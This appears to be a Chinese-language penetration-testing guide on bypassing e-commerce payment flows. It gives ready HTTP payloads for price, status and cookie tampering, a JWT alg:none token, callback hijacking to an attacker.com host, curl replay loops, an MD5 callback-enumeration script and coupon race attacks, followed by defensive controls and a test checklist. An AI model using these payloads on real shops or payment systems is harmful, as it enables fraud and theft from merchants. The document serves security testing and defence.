---
attack_surface: [认证/授权绕过, 竞态/时序, 客户端利用, 配置缺陷]
impact: [身份伪造, 完整性破坏, 信息泄露]
risk_level: 严重
prerequisites:
  - HTTP 协议基础
  - Burp Suite / 拦截代理操作
  - Web 应用业务流程理解
related_techniques:
  - race-condition
  - 2fa-otp-bypass
  - account-takeover
  - business-logic-flaws
difficulty: 中级
tools:
  - Burp Suite
  - Turbo Intruder
  - Python requests / curl
---

# Bypass Payment Process — 支付流程绕过全指南

> 关联文档：[Race Condition](../Race%20Condition/README.md) · [2FA/OTP Bypass](../2FA-OTP%20Bypass/README.md) · [Account Takeover](../Account%20Takeover/README.md) · [Business Logic](../Business%20Logic/README.md)

---

# 0x01 背景与原理

## 1.0 TL;DR

支付流程绕过是一类**业务逻辑漏洞**，攻击者通过篡改客户端-服务端交互数据（请求参数、HTTP 响应、Cookie、Session Token），或利用并发竞态条件，使服务端在错误状态下完成交易——以 0 元 / 修改后价格 / 绕过付款步骤直接"购买"商品或服务。

## 1.1 根本原理

电商/支付系统的核心假设是"客户端不可信"，但实际上大量系统将关键业务决策委托给客户端传入的参数。典型模式：

```
用户选择商品 → 生成订单 → 跳转支付网关 → 支付回调 → 订单状态更新
    ↑                                    ↑              ↑
  篡改价格                          劫持回调         修改状态
```

### 为什么这些漏洞持续存在？

1. **过度信任客户端参数** — 服务端接受客户端传入的 `price`、`amount`、`success` 等参数作为权威值，而非从数据库/服务端会话中重新获取
2. **状态机设计缺陷** — 支付流程允许多条非法路径（如跳过支付步骤直接到发货状态）
3. **缺乏幂等性保护** — 同一笔优惠券/积分可被多次使用
4. **竞态窗口** — 并发请求可在极短窗口内多次获取同一资源

## 1.2 攻击面分类

| 分类 | 攻击向量 | 典型场景 |
|------|---------|---------|
| 参数篡改 | 修改请求中的价格/状态参数 | `price=100` → `price=1` |
| 响应篡改 | 拦截并修改服务端响应 | `"success":false` → `"success":true` |
| Cookie/Session 操纵 | 修改客户端存储的状态数据 | `discount_used=1` → `discount_used=0` |
| URL/回调劫持 | 篡改回调地址或重放回调 URL | 重放支付成功回调请求 |
| 竞态条件 | 并发请求突破限次/限时保护 | 并行使用同一张优惠券 50 次 |
| 逻辑跳跃 | 跳过关键流程步骤 | 直接访问第 3 步 URL，绕过第 2 步支付 |

## 1.3 影响维度

- [x] **完整性破坏** — 篡改交易金额、商品数量、订单状态
- [x] **身份伪造** — 通过 Session 操纵冒用他人支付状态
- [ ] **可用性破坏** — （间接）大量滥用可导致优惠券/库存耗尽
- [x] **信息泄露** — 回调 URL 或响应可能泄露订单/用户信息

## 1.4 风险评级

| 等级 | 条件 |
|------|------|
| **严重** | 无需认证即可篡改、可自动化批量利用、影响金额无上限 |
| **高** | 需登录但可修改任意订单金额、可重复使用优惠券 |
| **中** | 需特定条件（如已知回调 URL 格式）、影响有上限 |

---

# 0x02 入口点检测

## 2.1 交易流程的 Burp Suite 代理监控

在交易过程中，拦截**所有**客户端与服务端之间的数据交互是第一步。关注以下关键请求：

```
POST /cart/checkout HTTP/1.1
POST /order/create HTTP/1.1
POST /payment/process HTTP/1.1
GET  /payment/callback?status=success&order_id=12345
POST /order/complete HTTP/1.1
```

## 2.2 关键参数识别

在拦截到的请求中，重点检查具有以下特征的参数：

| 参数类型 | 常见参数名 | 含义 |
|----------|----------|------|
| **状态指示** | `success`, `status`, `paid`, `complete`, `result` | 交易/支付状态 |
| **来源标识** | `referrer`, `ref`, `source`, `return_url` | 请求来源或跳转目标 |
| **回调地址** | `callback`, `redirect`, `return`, `notify_url`, `webhook` | 支付完成后回调 URL |
| **金额字段** | `price`, `amount`, `total`, `cost`, `fee`, `sum` | 订单金额 |
| **数量字段** | `quantity`, `qty`, `count`, `num` | 商品数量 |
| **折扣字段** | `discount`, `coupon`, `voucher`, `promo`, `code` | 折扣/优惠券码 |
| **ID 字段** | `order_id`, `transaction_id`, `payment_id`, `invoice` | 订单/交易标识 |
| **用户标识** | `user_id`, `account`, `email`, `customer_id` | 用户身份 |

## 2.3 参数含义推断方法

1. **观察正常流程** — 先完整走一次正常交易，记录每个请求的参数和响应
2. **修改单一变量** — 每次只改一个参数值，观察行为变化
3. **移除参数** — 删除某个参数观察系统是否有默认值或回退行为
4. **类型变换** — 将数字改为负数/浮点数/极大值/字符串/NULL
5. **编码变异** — URL 编码、双重编码、Unicode 编码参数值

---

# 0x03 参数篡改 — 请求参数操纵

## 3.1 状态参数篡改

### 原理

服务端依赖客户端传入的状态参数（如 `success=true`）来决定交易结果，而非从支付网关的回调中获取权威状态。

### 检测方法

在支付流程的**最后一步**观察请求参数。如果出现以下类似参数，尝试篡改：

```
POST /order/finalize HTTP/1.1
Host: target.com

order_id=12345&success=false&payment_status=pending
```

```
POST /order/finalize HTTP/1.1
Host: target.com

order_id=12345&success=true&payment_status=paid
```

### Payload 变体

```http
# 基础布尔翻转
POST /payment/confirm HTTP/1.1
Host: target.com

transaction_id=TX123&status=failed → status=success
transaction_id=TX123&paid=0         → paid=1
transaction_id=TX123&result=false   → result=true
```

```http
# 状态码变换
POST /order/update HTTP/1.1
Host: target.com

order_id=123&status=0  → status=1
order_id=123&status=1  → status=2  (1=已支付, 2=已发货)
```

```http
# JSON body 篡改
PUT /api/order/123 HTTP/1.1
Content-Type: application/json

{"status": "pending_payment"} → {"status": "paid"}
{"paid": false}               → {"paid": true}
{"paymentStatus": 0}          → {"paymentStatus": 1}
```

### 实战场景

**场景：绕过支付直接激活会员**

某网站 VIP 购买流程最后一步：
```
POST /user/upgrade HTTP/1.1
plan=premium&payment_id=ch_xxx&upgrade_success=false
```

将 `upgrade_success=false` 改为 `upgrade_success=true`，服务端直接将会员状态更新为 premium，未验证 payment_id 的真实支付状态。

## 3.2 金额参数篡改

### 原理

服务端接受客户端传入的商品价格或订单金额，而非从数据库查询商品定价。

### Payload 变体

```http
# 直接修改价格
POST /cart/checkout HTTP/1.1
Host: target.com

product_id=100&price=199.00&quantity=1
→
product_id=100&price=0.01&quantity=1
```

```http
# 负数量攻击 — 将总价降低为 0
POST /cart/add HTTP/1.1
Host: target.com

product_id=100&quantity=1&price=199.00    # 商品A: $199
product_id=200&quantity=-1&price=199.00   # 商品A负数: -$199
# 总价 = 199 + (-199) = 0
```

```http
# 浮点数精度攻击
POST /payment/create HTTP/1.1

amount=0.0001  # 四舍五入后可能显示为 $0.00
```

```http
# 整数溢出（旧版 PHP/32 位系统）
POST /payment/create HTTP/1.1

amount=-2147483648  # INT_MIN，在某些系统可能被处理为 0
```

### 实战场景

**场景：Burger King 法国 — 1 分钱套餐**

价格参数 `amount` 随请求一起发送且未在服务端校验。修改请求中的 `amount=9.90` 为 `amount=0.01`，成功以 1 分钱购买套餐。

## 3.3 数量/库存参数篡改

### Payload 变体

```http
# 减少数量为 0 后加购额外项目
POST /cart/update HTTP/1.1

product_id=100&quantity=0&coupon=FREE50  # 数量为 0 仍可使用优惠券
```

```http
# 小数/负数数量
POST /cart/add HTTP/1.1

product_id=100&quantity=0.00001  # 极端小数 → 总价可能为 0
product_id=100&quantity=-1       # 负数可能在服务端退款
```

## 3.4 参数移除攻击

### 原理

部分系统对缺失参数有默认值或回退行为。如果 `price` 参数缺失时系统默认 `price=0`，则可利用此特性。

```http
# 原始请求（移除 price 参数）
POST /order/create HTTP/1.1

product_id=100&quantity=1
# 如果服务端默认 price=0，直接生成 $0 订单
```

---

# 0x04 响应篡改 — 服务端响应操纵

## 4.1 原理

客户端（浏览器/App）接受服务端返回的状态信息并据此渲染 UI 或执行后续操作。如果攻击者能拦截并修改服务端的 HTTP 响应，可在客户端层面伪造"支付成功"状态。

## 4.2 技术实现

### 使用 Burp Suite 拦截并修改响应

```
Step 1: 发起支付请求
Step 2: 拦截服务端的 JSON/HTML 响应
Step 3: 修改状态字段后放行
```

### Payload 变体

```json
// 原始响应
{
  "result": "failure",
  "message": "Payment declined",
  "order_id": "12345",
  "redirect": "/payment-failed"
}

// 篡改后
{
  "result": "success",
  "message": "Payment confirmed",
  "order_id": "12345",
  "redirect": "/order/12345/confirmation"
}
```

```http
# 修改 HTTP 状态码
HTTP/1.1 402 Payment Required → HTTP/1.1 200 OK
```

```json
// 修改支付金额（使系统误以为已付全款）
// 原始
{"paid_amount": 0, "total_amount": 199.00, "remaining": 199.00}

// 篡改后
{"paid_amount": 199.00, "total_amount": 199.00, "remaining": 0}
```

## 4.3 限制

- 响应篡改主要影响**客户端逻辑**（前端显示"支付成功"），通常不改变服务端数据库状态
- 但在以下场景有效：服务端不独立验证，仅根据客户端后续请求中的"确认"标记更新状态
- **关键判断**：修改响应后，客户端是否会向服务端发送一个携带"成功"标记的最终确认请求？如果有，且该确认请求的参数也可被篡改（见 0x03），则可串联利用

---

# 0x05 Cookie 与 Session 操纵

## 5.1 Cookie 值篡改

### 原理

网站将支付相关状态（折扣已使用、支付步骤、订单 ID）存储在客户端 Cookie 中。修改 Cookie 可重置折扣使用次数或跳过支付步骤。

### Payload 变体

```http
# 重置优惠券使用标志
Cookie: discount_used=1; cart_total=199
→
Cookie: discount_used=0; cart_total=1
```

```http
# 跳过支付步骤标志
Cookie: payment_step=1
→
Cookie: payment_step=3
```

```http
# 篡改 base64 编码的 Cookie
Cookie: order_info=eyJwcmljZSI6MTk5LCJzdGF0dXMiOiJwZW5kaW5nIn0=
# 解码: {"price":199,"status":"pending"}
# 重新编码: {"price":1,"status":"paid"}
Cookie: order_info=eyJwcmljZSI6MSwic3RhdHVzIjoicGFpZCJ9
```

```http
# JWT Token 中的角色/权限字段（如果签名未验证或使用 none 算法）
Cookie: auth_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJwYWlkIjpmYWxzZX0.
# 修改 payload 中 "paid":false → "paid":true，配合 alg:none
```

## 5.2 Session Token 操纵

### 原理

如果 Session Token 与支付状态之间存在关联，攻击者可以通过操纵 Session 来影响支付流程。

### 技术

```http
# 并行 Session 攻击 — 同时操作两个 Session 绕过支付
1. 浏览器 Tab A: 登录用户 A，完成支付到第 2 步（共 3 步）
2. 浏览器 Tab B: 登录用户 A 的第二个 Session
3. Tab A: 完成支付第 3 步
4. Tab B: 利用第 2 步的 Session 状态访问订单完成页面
```

```http
# Session 固定 + 支付状态攻击
1. 攻击者用自己的账户开启支付流程
2. 在支付确认前，获取 Session Token
3. 将受害者诱骗至使用同一 Session Token 的页面
4. 受害者完成支付 → 攻击者账户获得商品
```

---

# 0x06 URL 分析与回调劫持

## 6.1 MD5HASH 模式 URL 分析

### 原理

部分系统使用 Hash 标识符作为支付请求的唯一标识，如果 Hash 是可预测的，攻击者可以枚举或重放其他人的支付回调 URL。

### 检测方法

遇到包含 `MD5HASH` 模式的 URL，如：
```
https://example.com/payment/callback/5d41402abc4b2a76b9719d911017c592
```

1. **复制 URL** — 提取完整的回调 URL
2. **新窗口打开** — 在新浏览器窗口中访问该 URL，观察响应
3. **分析 Hash 构造** — 判断 Hash 是否基于已知参数（order_id、user_id、timestamp）
4. **尝试重放** — 对该 URL 发起多次请求，观察是否有幂等性保护

### Hash 可预测性分析

```python
# 如果是 MD5(order_id)，攻击者可枚举所有订单的回调
import hashlib
for order_id in range(10000, 99999):
    hash_val = hashlib.md5(str(order_id).encode()).hexdigest()
    url = f"https://target.com/payment/callback/{hash_val}"
    # 发送请求，检查是否返回"支付成功"状态
```

```bash
# 尝试直接访问回调 URL 观察行为
curl -v "https://target.com/payment/callback/MD5HASH"
```

## 6.2 Callback / Referrer 参数劫持

### 原理

`callback`、`redirect`、`return`、`referrer` 参数告诉支付网关支付完成后将用户重定向到哪里。如果这些参数可被操纵，攻击者可以：

1. 将支付成功回调重定向到攻击者的服务器，截获支付验证参数
2. 替换为攻击者构造的"假回调"URL，诱导服务端向攻击者发送确认请求

### Payload 变体

```http
# 回调 URL 劫持
POST /payment/create HTTP/1.1
Host: target.com

amount=100&callback=https://target.com/payment/success?order_id=123
→
amount=100&callback=https://attacker.com/steal?order_id=123
```

```http
# Referrer 参数篡改 — 跳过来源验证
POST /checkout HTTP/1.1
Host: target.com
Referer: https://target.com/cart

...
# 如果服务端仅验证 Referer 是否包含 target.com 作为支付前置步骤：
POST /checkout HTTP/1.1
Host: target.com
Referer: https://attacker.com/target.com/cart/fake
```

```http
# Open Redirect 串联 — 利用合法重定向绕过回调白名单
callback=https://payment-gateway.com/redirect?url=https://attacker.com/steal
# 支付网关白名单通过了，但网关本身有 Open Redirect
```

## 6.3 回调重放攻击

### 原理

如果支付回调 URL 没有一次性使用（nonce）或幂等性保护，攻击者可以重复发送同一个"支付成功"回调来多次触发订单完成操作。

```bash
# 捕获一次合法的支付成功回调
POST /payment/callback HTTP/1.1
Host: target.com

order_id=12345&status=success&transaction_id=pay_abc123&amount=199.00

# 重放该请求 10 次（如果无保护，可能生成 10 个已完成订单）
for i in $(seq 1 10); do
  curl -X POST https://target.com/payment/callback \
    -d "order_id=12345&status=success&transaction_id=pay_abc123&amount=199.00"
done
```

---

# 0x07 折扣/优惠券滥用

## 7.1 优惠券重复使用

### 原理

优惠券验证和使用状态更新之间存在时间窗口，并发请求可以在窗口内多次使用同一张优惠券。

### Payload

```http
# Turbo Intruder / 并发攻击 — 同一张优惠券使用 20 次
POST /cart/apply-coupon HTTP/1.1
Host: target.com

coupon_code=WELCOME50&order_id=12345
# 在 100ms 内发送 20 个并发请求
```

## 7.2 优惠券逻辑漏洞

```http
# 负数优惠券 — "折扣"变成"加钱"
# 原始
{"coupon": "SAVE10", "discount": -10, "total": 90}

# 如果修改 coupon 为
{"coupon": "SAVE10", "discount": -999999, "total": -999809}
# 有时系统处理不了负数总价，可能变为 0 或极小值
```

```http
# 优惠券叠加 — 同一订单使用多张不兼容的优惠券
POST /cart/apply-coupon HTTP/1.1
coupon_code=WELCOME50,SUMMER30,VIP20  # 叠加 50%+30%+20%
```

---

# 0x08 逻辑步骤跳跃

## 8.1 原理

支付流程是一个状态机，正常路径为：
```
购物车 → 填写地址 → 选择支付方式 → 确认订单 → 支付 → 支付成功回调 → 订单完成
```

如果服务端不验证每个步骤的前置条件，攻击者可以直接跳到后续步骤。

## 8.2 直接访问已知 URL 模式

```bash
# 常见模式：URL 中包含步骤编号或状态名称
curl https://target.com/checkout/step-3-confirm?order_id=12345   # 直接跳到确认
curl https://target.com/order/complete/12345                      # 直接完成订单
curl https://target.com/payment/success/12345                     # 直接触发成功回调
```

## 8.3 Referrer 头伪造

如果不能直接访问后续页面，尝试伪造 Referer 头：

```http
GET /checkout/step-3-confirm HTTP/1.1
Host: target.com
Referer: https://target.com/checkout/step-2-payment-success
# 某些系统通过 Referer 验证"是否从上一步来"
```

---

# 0x09 竞态条件利用

## 9.1 原理

当支付系统在高并发场景下对共享资源（优惠券余额、库存、积分）的检查和消费操作之间存在时间窗口，攻击者可以利用竞态条件在窗口内多次消费同一资源。

典型的检查-使用模式：
```
1. 读取资源（优惠券余额: $50）
2. 验证资源充足（$50 >= 订单金额 $50 ✓）
3. 消费资源（扣减 $50，余额变为 $0）
```

如果步骤 2 和步骤 3 之间存在时间窗口，多个并发请求可同时通过验证，然后各自扣减，导致超额使用。

## 9.2 并发支付/充值攻击

```http
# 场景：账户余额 $100，商品价格 $100
# 目标：同时发起 2 个支付请求，在余额扣减前通过验证

# Turbo Intruder 脚本 (HTTP/1.1 Last-Byte Sync)
POST /payment/create HTTP/1.1
Host: target.com

amount=100&product_id=500

# 预期：只有 1 个请求通过（$100 余额只能买 1 件）
# 成功：2 个请求均通过（余额未及时更新 → 以 $100 买到 $200 商品）
```

## 9.3 并发充值（Race Condition 变体）

```http
# 场景：充值接口有检查-更新的时间窗口
# 账户余额：$0
# 充值金额：$100
# 攻击：在 100ms 内发送 5 个充值请求

POST /wallet/topup HTTP/1.1
Host: target.com

amount=100&payment_method=card&card_token=tok_xxx

# 如果余额更新是 UPDATE balance = balance + 100 WHERE user_id = 123
# 且没有行锁（SELECT ... FOR UPDATE），5 个并发请求都可能是基于 balance=0 更新
# 结果：支付 1 次 $100，获得 5 次充值 = $500
```

详细技术参考：[Race Condition](../Race%20Condition/README.md)

---

# 0x0A 防御策略

## 10.1 服务端权威校验（根本原则）

```
❌ 错误：price 从客户端传入 → 服务端直接使用
✅ 正确：product_id 从客户端传入 → 服务端查数据库获取 price
```

| 维度 | 错误做法 | 正确做法 |
|------|---------|---------|
| **价格** | 接受客户端的 `price` 参数 | 仅根据 `product_id` 从 DB 查询价格 |
| **状态** | 接受客户端的 `success` 参数 | 仅信任支付网关的回调 + 签名验证 |
| **优惠券** | 客户端标记 `coupon_used=` | 服务端记录已使用的优惠券并加锁验证 |
| **步骤** | 通过 Referer 判断来源 | 服务端 Session 维护状态机当前步骤 |
| **回调** | 接受任意 URL 的回调 | 白名单 + 签名验证 + nonce 防重放 |

## 10.2 关键防御措施

1. **价格服务端计算** — 价格、折扣、税费全部在服务端基于数据库数据计算，不信任任何客户端传入的金额
2. **支付网关签名验证** — 回调请求必须带 HMAC 签名，服务端验证签名后再更新订单状态
3. **幂等性保护** — 每笔交易使用唯一 `idempotency_key`，同一 key 只能被执行一次
4. **数据库行级锁** — 余额/库存扣减使用 `SELECT ... FOR UPDATE` 或乐观锁（version 字段）
5. **状态机强制验证** — 服务端 Session 维护当前步骤，拒绝跳过步骤的请求
6. **优惠券/折扣去重** — 每张优惠券在数据库标记为已使用，使用唯一约束防重复
7. **并发限流** — 对支付接口进行请求速率限制（针对同一 user_id / order_id）
8. **回调 nonce 防重放** — 每个回调 URL 包含一次性的随机 nonce，服务端验证后标记为已处理

## 10.3 安全测试清单

- [ ] 所有金额参数是否来自服务端而非客户端？
- [ ] 支付回调是否有签名验证（HMAC/RSA）？
- [ ] 订单状态更新是否仅依赖已验证的回调？
- [ ] 优惠券/折扣是否可以重复使用？
- [ ] 是否存在跳过支付步骤直接访问后续 URL 的可能？
- [ ] 高并发场景下余额/库存扣减是否安全（行锁/乐观锁）？
- [ ] 回调 URL 是否有重放保护（nonce/idempotency_key）？
- [ ] 参数缺失/负数/极端值时系统行为是否安全？

## 10.4 测试技巧

- **正常流程基线记录** — 先完整走一遍正常交易，记录所有请求/响应作为基线
- **单参数变异** — 每次只修改一个参数，观察系统行为变化
- **并发测试** — 使用 Turbo Intruder 或自定义 Python 脚本进行并发请求
- **响应篡改** — 修改响应后观察客户端后续请求是否携带可被利用的"确认"标记
- **负数/零值/极端值测试** — 对数字参数尝试 -1, 0, 0.0001, 999999999, NULL, ""

---

## 参考资料

- [HackTricks — Bypass Payment Process](https://book.hacktricks.wiki/en/pentesting-web/bypass-payment-process.html)
- [PortSwigger — Smashing the State Machine (Race Condition)](https://portswigger.net/research/smashing-the-state-machine)
- [OWASP — Business Logic Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)
- [HackerOne Hacktivity — Payment Bypass Disclosures](https://hackerone.com/hacktivity?query=payment%20bypass)
